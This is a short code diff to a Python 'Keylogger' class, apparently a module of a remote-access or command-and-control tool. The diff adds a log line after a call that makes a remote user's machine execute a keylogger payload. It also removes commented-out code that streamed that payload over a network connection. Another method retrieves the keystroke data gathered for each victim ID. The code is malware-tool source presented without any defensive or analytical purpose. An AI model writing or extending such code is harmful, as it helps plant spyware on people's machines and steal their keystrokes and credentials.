@@ -1,4 +1,5 @@
 from dataManager.repository.userRepository import UserRepository
+import logging
 
 class Keylogger:
     def __init__(self, user_repository: UserRepository):
@@ -9,10 +10,7 @@ class Keylogger:
     async def inject(self, reader, writer, uuid):
         user = self.user_repository.get_user(uuid)
         await user.execute(self.payload_path)
-        # with open(self.payload_path, "rb") as f:
-        #     writer.write(f.read())
-        #     await writer.drain()
-        #     await reader.read(4096)
+        logging.info(f"Sent keylogger to {uuid}")
 
     async def action(self, message, uuid):
         keylogger_data = self.user_repository.get_user(uuid).module_data.get(self.module_name, "")
